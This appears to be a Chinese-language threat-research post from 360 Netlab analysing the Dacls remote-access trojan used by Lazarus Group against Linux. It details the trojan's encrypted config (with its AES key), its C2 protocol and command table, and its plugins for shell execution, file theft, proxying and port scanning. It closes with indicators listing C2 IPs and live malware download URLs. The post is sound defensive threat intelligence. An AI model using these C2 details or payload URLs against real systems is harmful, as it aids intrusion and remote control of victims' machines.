{
    "title": "lazarus group使用dacls rat攻击linux平台",
    "text": "13 MIN READ 12 MIN READ 1 post → DACLS Dacls, the Dual platform RAT Background On October 25, 2019, a suspicious ELF file (80c0efb9e129f7f9b05a783df6959812) was flagged by our new threat monitoring system. At first glance, it seems to be just another one of the regular botnets, but ROBOTO The awaiting Roboto Botnet Background introduction On August 26, 2019, our 360Netlab Unknown Threat Detection System highlighted a suspicious ELF file (4cd7bcd0960a69500aa80f32762d72bc) and passed along to our researchers to take a closer look, upon further analysis, we 360 Netlab Blog ‐ Network Security Research Lab at 360    2020   Latest Posts Twitter Ghost Dacls Dacls, the Dual platform RAT17 DECEMBER 2019  / DACLS Lazarus Group 使用Dacls RAT 攻击Linux 平  THIS POST WAS A COLLABORATION BETWEEN JINYE , GENSHEN YE 背景介绍 2019年10月25号，360Netlab 未知威胁检测系统发现一个可疑的 ELF文件 (80c0efb9e129f7f9b05a783df6959812) 。一开始，我 们以为这是在我们发现的Unknown Botnet 比较平凡的一个，并且在那 时候VirusTotal 上有 2款杀毒引擎能 够识别。当我们 关联分析它的相关 样 特征和 IoC时，我们发现这 个案例跟 Lazarus Group 有关，并决定 深入分析它。 目前，业界也从未公开 过关于 Lazarus Group 针对 Linux平 的攻 击样 和案例。通 过详 细的分析，我 们确定这是一款功能完善，行 为隐蔽并适用于 Windows 和Linux平 的 RAT 程序，并且其幕后攻 击者疑似 Lazarus Group 。 事实上，这款远程控制软件相关样 早在 2019年5月份就已 经出现，目前在 VirusTotal 上 显示被 26款杀毒软件厂商识别为泛型的恶意软件，但它还是不为人所知，我 们也没有找 到相关分析 报告。所以，我 们会详细披露它的一些技 术特征，并根据它的文件名和硬 编码 字符串特征将它命名 为Dacls。 Dacls 概览 Dacls是一款新型的 远程控制软件，包括 Windows 和Linux版 并共用 C2协议，我们将它 们分别命名为Win32.Dacls 和Linux.Dacls 。它的功能模 块化，C2协议使用 TLS和RC4双层 加密，配置文件使用 AES加密并支持 C2指令动态更新。其  Win32.Dacls 的插件模 块是通 过远程URL动态加载，而Linux版 的插件是直接 编译在Bot程序里。我 们已经确认在 Linux.Dacls  包含 6个插件模 块：执行命令，文件管理， 进程管理，测试网络访问，C2连接 代理，网络扫描。 如何关联上 Lazarus Group  先，我们通过样 80c0efb9e129f7f9b05a783df6959812  的硬编码字符串特征  c_291 0.cls和k_3872.cls ，在VirusTotal 上找到了 5个样 ，我们从这些样 代码和相同的 C2 指令码上可以确 认它们是同  套RAT程序，并且分 别适 于Windows 和Linux平 。 其   个Win32.Dacls 样 6de65fc57a4428ad7e262e980a7f6cc7 ，它的下载地址为http s://thevagabondsatchel.com/wp-content/uploads/2019/03/wm64.avi ，在VirusTotal 社区  户@raeezabdulla 留  将它标记为 Lazarus Group ，并引  了 篇报告《CES Themed Targeting from Lazarus 》。然后，我 们通过这个下载地址我们关联到另  个 NukeSped 样 b578ccf307d55d3267f98349e20ecff1 ，它的下载地址为http://thevaga bondsatchel.com/wp-content/uploads/2019/09/public.avi 。在2019年10 份，这个 NukeSped 样 b578ccf307d55d3267f98349e20ecff1 曾被推特  户@cyberwar_15 标记 为Lazarus Group 。 另外，我们也在 Google上搜到到很多 Lazarus Group 的分析报告和  些开源威 胁情报数 据，并指出 thevagabondsatchel.com 曾被 Lazarus Group 于存放样 。 所以，我们推测Dacls RAT 的幕后攻 击者是 Lazarus Group 。 Downloader 服务器 我们在疑似被感染的下 载服务器http://www.areac-agr.com/cms/wp-content/uploads /2015/12/ 上找到了一系列 样 ，其 包括 Win32.Dacls 和Linux.Dacls ，开源程序 Socat， 以及 Confluence CVE-2019-3396 Payload 。所以，我 们推测Lazarus Group 曾经利用 CVE-2019-3396 N-day 漏洞传播Dacls Bot 程序。 MD5 (check.vm) = a99b7ef095f44cf35453465c64f0c70c  //Confluence CVE-2019-3396 Payload MD5 (hdata.dat) = 982bf527b9fe16205fea606d1beed7fa //Log Collector MD5 (ldata.dat) = 80c0efb9e129f7f9b05a783df6959812 //Linux Dacls Bot MD5 (mdata.dat) = 80c0efb9e129f7f9b05a783df6959812 //Linux Dacls Bot MD5 (r.vm) = a99b7ef095f44cf35453465c64f0c70c      //Confluence CVE-2019-3396 Payload MD5 (rdata.dat) = bea49839390e4f1eb3cb38d0fcaf897e //Windows Dacls Bot MD5 (sdata.dat) = e883bf5fd22eb6237eb84d80bbcf2ac9 //Open-Source Socat 逆向分析 Log Collector 样 分析 MD5: 982bf527b9fe16205fea606d1beed7fa ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header 这个样 的功能很 简单，它通过运行参数指定 志搜集接口然后收集目 标主机信息。它 会避开扫描一些指定的根目 录和二级目录，并把检索到的文件路径写入  /tmp/hdv.log 。 Avoid Scanning Root Directory /bin /boot /dev /etc /lib /lib32 /lib64 /lost+found /sbin /sys /tmp /proc /run Avoid Scanning Secondary Directory /usr/bin /usr/etc /usr/games /usr/include /usr/lib /usr/lib32 /usr/lib64 /usr/libexec /usr/sbin /usr/share /usr/src /usr/tmp /var/adm /var/cache /var/crash /var/db /var/empty /var/games /var/gopher /var/kerberos /var/lock /var/nis /var/preserve /var/run /var/yp  志记录格式示例 deep    name      type    size    last date 0       /         D       0       000000000000 1       bin       D       0       201911290628 2       bash      F       1037528 201907121226 2       bunzip2   F       31352   201907040536 2       busybox   F       1984584 201903070712 2       bzcat     F       31352   201907040536 2       bzcmp     F       2140    201907040536 .... 最后通过执行系统tar命令把 志文件 压缩tar -cvzf /tmp/hdv.rm /tmp/hdv.log  并上 传到指定 志搜集接口。 Linux.Dacls 样 分析 MD5: 80c0efb9e129f7f9b05a783df6959812 ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e14724498374cb9b80a77b7bfeb1d1bd342ee139, stripped Linux.Dacls Bot 主要功能包括： 执行命令，文件管理， 进程管理，测试网络访问，C2连接 代理，网络扫描模块。 初始化行 为 Linux.Dacls Bot 启动后以 daemon方式后 运行，并通 过启动参数/pro，Bot PID文件/v ar/run/init.pid 和Bot进程名/proc/<pid>/cmdline ，来区分不同运行 环境，我们猜测 可能是用于 Bot程序升级。 配置文件  .memcahce Linux.Dacls Bot 配置文件固定存放在 $HOME/.memcache ，文件内容固定 为0x8E20+4 个 字节。如果 Bot启动后找不到配置文件，就会根据 样  硬编码的信息，使用 AES加密生 成默认的配置文件，当 Bot和C2 通信后还会继续更新配置文件。 数据结构 我们把配置文件的数据 结构信息定 义为 struct_global_cfg ，这里存放了 Bot运行参数， C2 信息，和插件信息等。 struct struct_plugin_cfg_data {   int plugin_id;   int plugin_type;   int unk3;   char name[1040]; }; struct struct_c2_content {   char content[2048]; }; struct struct_global_cfg {   int session_id;   int unk_const1;   int sus_version_20190417;   int connect_retry_sleep_time;   char unk_array1[88];   int c2_num;   struct_c2_content c2_list[3];   char unknown_filed_186C[14340];   struct_plugin_cfg_data plug_cfg_data_list[15]; }; AES 加密算法 AES，CBC Mode Key：A0 D2 89 29 27 78 75 F6 AA 78 C7 98 39 A0 05 ED IV：39 18 82 62 33 EA 18 BB 18 30 78 97 A9 E1 8A 92 解密配置文件 我们把配置文件解密后，可以看到配置文件 一些明文信息，例如：会 话ID，版 信息， 重新连接C2时间，C2信息等，当成功 连接C2后配置文件会根据 C2指令更新，比如在配置 文件 增加 Bot支持的插件信息，更新 C2信息等。 C2 协议 Linux.Dacls Bot 和C2通信主要分 为3个阶段，并采用了 TLS和RC4双层加密算法，保障数 据通信安全。第 1阶段是建立 TLS连接，第 2阶段是双方 协议认证过 程（Malware Beaconing ），第 3阶段是 Bot发送RC4加密后的数据。 SSL 连接 协议认证 建立 SSL连接会发送若干次 Beacon消息和 C2互相确认身份。 CMD DIRECTION ENCRYPTED DESCRIPTION 0x20000 send no Beacon 0x20100 recv no Beacon 0x20200 send no Beacon RC4 加密和解密流程 RC4 Key 生成算法，完全由随机函数生成， Key长度范围：大于 0且小于 50 置换表生成算法，根据 RC4 Key 生成 RC4加密用的置 换表 加/解密算法，根据置 换表生成算法完成加 /解密，因为RC4是个对称加密算法，所 以加 /解密算法是一致的 RC4解密示例 在完成协议认证 之后， Bot向C2发送RC4 Key 长度（头4个字节）和 RC4 Key 数据。 C2收到加密 Key，向Bot发送密文，解密后 为0x00000700 指令，之后 Bot就会上传主机名 相关信息 给C2。 Key: a3 2f c2 10 f3 92 79 c3  0e f6 e4 e5 2e 69 29 86 0d 3a 92 f5 b7 23 fc 91  d9 46 91 55 a3 86 5a 47 36 1d 58 2a af d1 6d 3d  49 52 23 77 bc 4d fd 49 87  密文: fe 3c 2c d7 bf 08 e3 91  d7 00 1f d0 明文: 00 07 00 00 00 00 00 00  00 00 00 00  C2指令码表 Linux.Dacls Bot 接受的指令 实际共12个字节，但实际有效大小 为4个字节，并分成控制两 种模式。 第一种模式：当第 3个字节为 0，控制 Bot主逻辑。 以下是 0x00000700 指令对应的网络序数据包示例：模式 为0x00，指令 2为0x07控制 Bot 上传主机名信息 指令 1指令 2模式 未知 00 07 00 00 第二种模式：当第 3个字节为 1，控制加载插件逻辑。 以下是 0x00010101 指令对应的网络序数据包示例：模式 为0x01，指令 1为0x01控制加载 编号为1的插件 指令 1指令 2模式 未知 01 01 01 00 Bot收到指令后， 执行成功返回 0x20500 ，执行失败返回 0x20600 。 C2指令表， Bot主逻辑部分 MODULE CMD ENCRYPT DESCRIPTION Core 0x00000601 Yes 上传C2配置信息 Core 0x00000602 Yes 下载配置信息保存到  $HOME/.memcache Core 0x00000700 Yes 要求Bot上传主机信息 Core 0x00000900 Yes 要求Bot发送心跳信息 C2指令表， Bot插件部分 MODULE CMD ENCRYPT DESCRIPTION /bin/bash 0x00010000 Yes 执行C2下发的bash命令 /bin/bash 0x00010002 Yes 连接到指定的 C2执行下发的系统命令 plugin_file 0x00010100 Yes 写文件 plugin_file 0x00010101 Yes 读文件 plugin_file 0x00010103 Yes 删除文件 plugin_file 0x00010104 Yes 扫描目录结构 plugin_file 0x00010110 Yes 从指定 url下载文件 plugin_process 0x00010200 Yes 扫描并上传主机进程相关信息 plugin_process 0x00010201 Yes 杀死指定进程 plugin_process 0x00010202 Yes 创建daemon进程 plugin_process 0x00010204 Yes 获得并上报进程PID和PPID plugin_test 0x00010300 Yes 测试是否可以 访问指定IP plugin_reverse_p2p 0x00010400 Yes C2连接代理 logsend 0x00011100 Yes 测试是否可以 访问Log服务器 logsend 0x00011101 Yes 上传公网端口 扫描结果和命令 执行输出 logsend 0x00011102 Yes 无操作 C2通信流程 图 插件模块 Linux.Dacls Bot 采用静态编译的方式将插件和 Bot 体代码编译在一起，通 过发送不同 的指令调用不同的插件可以完成多种任 务。我们分析的样  共包含 6个插件，由于插件 的配置信息是一 块连续的结构体数组(0x00~0x0e) 。我们猜测Bot可能存在更多的插件。 每个插件都会有相 应的配置信息，它 们会保存在 Bot的配置文件 $HOME/.memcache  ，在 插件初始化 时，加载这些配置信息。 Bash 插件 Bash插件是编号为0的插件，主要支持两个功能：接收 C2服务器的下发的系统命令并执 行；C2通过指令下发临时 C2，Bot然后连接到临时 C2并执行临时 C2下发的系统命令。 File 插件 File插件主要功能是文件管理，除了支持 对文件的读，写，删除，查找操作，还可以从指定 的下载服务器下载文件。 Process 插件 Process插件的主要功能是 进程管理，包括： 杀死指定进程，创建daemon进程，获得当前 进程的 PID和PPID，以及获取进程列表信息。 如果 Linux进程 的 PID对应的/proc/<pid>/task 目录存在， Bot样 会收集如下 进程信 息： 从/proc/<pid>/cmdline 读取命令行全名 从/proc/<pid>/status  读取: Name      // 进程名 Uid       // 用户ID Gid       // 用户组ID PPid      // 父进程ID Test插件 Test插件的主要功能是通 过连接C2指定的 IP地址和端口， 测试其网络连通性。 Reverse P2P 插件 Reverse P2P 插件实际上是一种 C2连接代理（ Connection Proxy ），它通过下发控制命令 可以将指定的 C2数据完整的 转发到指定 IP端口。这在Lazarus Group  是一种常 见的降 低被检测风险 的技术手段，既可以减少目 标主机连接数又可以 隐藏目标主机和真 实C2的 通信数据，在某些 场合还可以利用被感染的内网主机 进一步渗透至隔离网段。 reverse_p2p 插件初始化 当Bot收到指令后，先 尝试连接指定的 C2端口并发送0x21000 指令，如果 C2返回 0x21300 说明C2连接成功。此 时Bot会连接指令 指定的目 标主机端口，如果 连接成功会返回 0x21100 给C2说明转发连接已经建立可以 转发数据。接下来 Bot会将 C2发送过来的数据 完整的转发给目标主机，同时将目标主机的返回数据完整的返回 给C2，直至任何一方  断连接。 以下是 Reverse P2P 插件工作流程 图： LogSend 插件 LogSend 插件主要包括 3个功能：测试连接Log服务器，随机扫描全网 8291端口并上 报给 Log服务器，执行耗时较长的系统命令并将控制  输出结果实时上报给 Log服务器。 LogSend 插件初始化 LogSend 相关操作回 调函数 测试连接Log服务器 Bot收到指令后会向 Log服务器发送一个测试请求。如果 Log服务器返回{\"result\":\"ok\" }说明测试成功，此时C2就可以下 发更多的 LogSend 指令。 使用 C2指定的 HTTP接口地址，内置的 User-Agent ，发送POST请求 POST /%s HTTP/1.0 Host: %s Content-Length: 9 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Cache-Control: no-cache Connection: close log=check 随机扫描全网 8291端口并上 报给 Log服务器。 当Bot收到该指令后会按照 3种规则随机生成公网 IP地址并尝试连接8291端口，如果 连接 成功就向 log server 回传扫描结果。 IP生成规则： ip = <part1>.<part2>.<part3>.<part4> rule1: part1 != 127 rule2: part1 == 172 and (part2 <= 15 or part2 > 31) rule3: part1 != 192 and part2 != 168 rule4: part1 != 10 随机 IP生成算法如下 我们可以看到 Bot硬编码 TCP/8291 端口，并调用系统connect函数进行端口扫描，只检测 端口是否开放，不 发送Payload数据。我们知道 MikroTik Router 设备的Winbox协议工作 在TCP/8291 端口上，并暴露在互 联网上，之前我 们也披露了 2篇文章关于 TCP/8291 端口 威胁事件 [1][2]。 执行耗时较长的bash命令，并将控制  输出实时上报给 Log服务器。 执行bash命令并转发输出给Log服务器 所有上报的Log数据都以 HTTP POST 的方式提交。 Payload部分的格式如下： log=save&session_id=<session id>&value=<log content> 处置建议 我们建议Confluence 用户及时更新补丁，并根据 Dacls RAT 创建的进程，文件名以及 TCP 网络连接特征，判断是否被感染，然后清理它的相关 进程和文件。 我们建议读者对Dacls RAT 相关 IP，URL和域名进行监控和封锁。 相关安全和 执法机构，可以 邮件联系netlab[at]360.cn 交流更多信息。 联系我们 感兴趣的读者，可以在  twitter  或者在微信公众号  360Netlab  上联系我们。 IoC list 样 MD5 6de65fc57a4428ad7e262e980a7f6cc7 80c0efb9e129f7f9b05a783df6959812 982bf527b9fe16205fea606d1beed7fa 8910bdaaa6d3d40e9f60523d3a34f914 a99b7ef095f44cf35453465c64f0c70c bea49839390e4f1eb3cb38d0fcaf897e cef99063e85af8b065de0ffa9d26cb03 e883bf5fd22eb6237eb84d80bbcf2ac9 硬编码 C2 IP： 23.81.246.179        United States        ASN19148             Leaseweb USA, Inc.   23.254.119.12        Canada               ASN55286             B2 Net Solutions Inc. 23.227.196.116       United States        ASN35017             Swiftway Sp. z o.o.  37.72.175.179        United States        ASN29802             HIVELOCITY, Inc.     23.227.199.53        United States        ASN35017             Swiftway Sp. z o.o.  107.172.197.175      United States        ASN36352             ColoCrossing         172.93.201.219       United States        ASN20278             Nexeon Technologies, Inc. 64.188.19.117        United States        ASN8100              QuadraNet Enterprises LLC 74.121.190.121       United States        ASN23033             Wowrack.com          192.210.213.178      United States        ASN36352             ColoCrossing         209.90.234.34        United States        ASN23033             Wowrack.com          198.180.198.6        United States        ASN26658             HT   URL http://www.areac-agr.com/cms/wp-content/uploads/2015/12/check.vm http://www.areac-agr.com/cms/wp-content/uploads/2015/12/hdata.dat http://www.areac-agr.com/cms/wp-content/uploads/2015/12/ldata.dat http://www.areac-agr.com/cms/wp-content/uploads/2015/12/mdata.dat http://www.areac-agr.com/cms/wp-content/uploads/2015/12/r.vm http://www.areac-agr.com/cms/wp-content/uploads/2015/12/rdata.dat http://www.areac-agr.com/cms/wp-content/uploads/2015/12/sdata.dat  360 Netlab Blog ‐ Network Security Research Lab at 360 — Lazarus Group 使用 Dacls RAT 攻击Linux平  Share this   "
}